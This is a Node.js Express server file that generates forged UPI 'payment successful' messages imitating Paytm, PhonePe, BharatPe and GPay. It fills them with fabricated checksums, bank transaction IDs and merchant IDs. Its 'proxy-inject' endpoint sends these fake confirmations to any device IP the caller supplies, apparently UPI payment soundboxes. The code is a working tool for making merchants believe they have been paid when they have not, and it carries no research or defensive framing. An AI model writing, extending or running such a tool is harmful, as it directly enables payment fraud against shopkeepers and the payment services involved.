'use strict';

const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');
const { body, query, validationResult } = require('express-validator');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(cors({
  origin: 'https://yourdomain.com',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  message: {
    success: false,
    error: 'Too many requests. Limit: 100 per minute per IP.'
  }
});

app.use('/api/', limiter);

const VENDOR_TEMPLATES = {
  paytm: (amount, txnId, timestamp) => ({
    vendor: 'paytm',
    event: 'PAYMENT_SUCCESS',
    transactionId: txnId,
    orderId: `PAYTM_ORDER_${txnId.replace(/-/g, '').substring(0, 12).toUpperCase()}`,
    amount: parseFloat(amount).toFixed(2),
    currency: 'INR',
    status: 'SUCCESS',
    responseCode: '01',
    responseMessage: 'Txn Successful',
    paymentMode: 'UPI',
    bankName: 'HDFC Bank',
    bankTxnId: `HDFC${Date.now()}`,
    txnDate: timestamp,
    checksumHash: uuidv4().replace(/-/g, ''),
    mid: `PAYTM_MID_${uuidv4().substring(0, 8).toUpperCase()}`,
    gatewayName: 'PAYTM',
    vpa: `customer@paytm`
  }),

  phonepe: (amount, txnId, timestamp) => ({
    vendor: 'phonepe',
    success: true,
    code: 'PAYMENT_SUCCESS',
    message: 'Your payment is successful.',
    data: {
      merchantId: `PHONEPE_${uuidv4().substring(0, 8).toUpperCase()}`,
      merchantTransactionId: txnId,
      transactionId: `T${Date.now()}`,
      amount: Math.round(parseFloat(amount) * 100),
      state: 'COMPLETED',
      responseCode: 'SUCCESS',
      paymentInstrument: {
        type: 'UPI',
        utr: `${Date.now()}`,
        vpa: `customer@ybl`,
        accountHolderName: 'Customer'
      }
    },
    timestamp
  }),

  bharatpe: (amount, txnId, timestamp) => ({
    vendor: 'bharatpe',
    status: 'SUCCESS',
    statusCode: 200,
    message: 'Payment received successfully',
    txnId,
    refId: `BP${Date.now()}`,
    amount: parseFloat(amount).toFixed(2),
    currency: 'INR',
    paymentMode: 'UPI',
    vpa: `customer@bharatpe`,
    merchantId: `BPMERCHANT${uuidv4().substring(0, 8).toUpperCase()}`,
    terminalId: `BPTERM${uuidv4().substring(0, 6).toUpperCase()}`,
    rrn: `${Date.now()}`.substring(0, 12),
    timestamp
  }),

  gpay: (amount, txnId, timestamp) => ({
    vendor: 'gpay',
    paymentStatus: 'SUCCESS',
    transactionStatus: 'COMPLETED',
    transactionId: txnId,
    referenceId: `GPAY_REF_${uuidv4().substring(0, 8).toUpperCase()}`,
    upiTransactionId: `${Date.now()}`,
    amount: parseFloat(amount).toFixed(2),
    currency: 'INR',
    payerVpa: `customer@okicici`,
    payeeVpa: `merchant@okaxis`,
    payeeName: 'Merchant',
    remarks: 'Payment successful',
    responseCode: '00',
    approvalRefNumber: `${Math.floor(Math.random() * 900000) + 100000}`,
    timestamp
  }),

  generic: (amount, txnId, timestamp) => ({
    vendor: 'generic',
    status: 'SUCCESS',
    transactionId: txnId,
    amount: parseFloat(amount).toFixed(2),
    currency: 'INR',
    paymentMethod: 'UPI',
    vpa: `customer@upi`,
    message: 'Payment completed successfully',
    rrn: `${Date.now()}`.substring(0, 12),
    timestamp
  })
};

const SUPPORTED_VENDORS = Object.keys(VENDOR_TEMPLATES);

app.get('/api/ping', (req, res) => {
  res.status(200).json({
    success: true,
    message: 'pong',
    uptime: process.uptime(),
    timestamp: new Date().toISOString()
  });
});

app.post(
  '/api/generate-payload',
  [
    query('vendor')
      .trim()
      .toLowerCase()
      .notEmpty().withMessage('vendor query param is required')
      .isIn(SUPPORTED_VENDORS).withMessage(`vendor must be one of: ${SUPPORTED_VENDORS.join(', ')}`),
    query('amount')
      .notEmpty().withMessage('amount query param is required')
      .isFloat({ min: 0.01, max: 1000000 }).withMessage('amount must be a positive number (max 1,000,000)')
  ],
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({
        success: false,
        errors: errors.array().map(e => ({ field: e.path, message: e.msg }))
      });
    }

    const vendor = req.query.vendor.toLowerCase();
    const amount = req.query.amount;
    const txnId = uuidv4();
    const timestamp = new Date().toISOString();

    const payload = VENDOR_TEMPLATES[vendor](amount, txnId, timestamp);

    return res.status(200).json({
      success: true,
      vendor,
      transactionId: txnId,
      payload
    });
  }
);

app.post(
  '/api/proxy-inject',
  [
    body('targetIP')
      .trim()
      .notEmpty().withMessage('targetIP is required')
      .matches(/^(\d{1,3}\.){3}\d{1,3}(:\d{1,5})?$/).withMessage('targetIP must be a valid IPv4 address, optionally with port (e.g. 192.168.1.1:8080)'),
    body('payload')
      .notEmpty().withMessage('payload is required')
      .isObject().withMessage('payload must be a JSON object')
  ],
  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({
        success: false,
        errors: errors.array().map(e => ({ field: e.path, message: e.msg }))
      });
    }

    const { targetIP, payload } = req.body;

    const hasPort = /:\d+$/.test(targetIP);
    const targetUrl = `http://${targetIP}${hasPort ? '' : ':80'}/`;

    try {
      const response = await axios.post(targetUrl, payload, {
        timeout: 8000,
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'UPI-Soundbox-Injector/1.0'
        }
      });

      return res.status(200).json({
        success: true,
        targetIP,
        statusCode: response.status,
        response: response.data
      });
    } catch (err) {
      const isTimeout = err.code === 'ECONNABORTED';
      const isRefused = err.code === 'ECONNREFUSED';
      const isUnreachable = err.code === 'ENETUNREACH' || err.code === 'EHOSTUNREACH';

      let errorMessage = 'Failed to forward payload to target';
      if (isTimeout) errorMessage = 'Connection to target timed out';
      if (isRefused) errorMessage = 'Connection refused by target';
      if (isUnreachable) errorMessage = 'Target host is unreachable';

      return res.status(502).json({
        success: false,
        targetIP,
        error: errorMessage,
        code: err.code || 'UNKNOWN'
      });
    }
  }
);

app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: `Route ${req.method} ${req.originalUrl} not found`
  });
});

app.use((err, req, res, next) => {
  console.error('[ERROR]', err.message);
  res.status(500).json({
    success: false,
    error: 'Internal server error'
  });
});

app.listen(PORT, () => {
  console.log(`UPI Soundbox API running on port ${PORT}`);
});
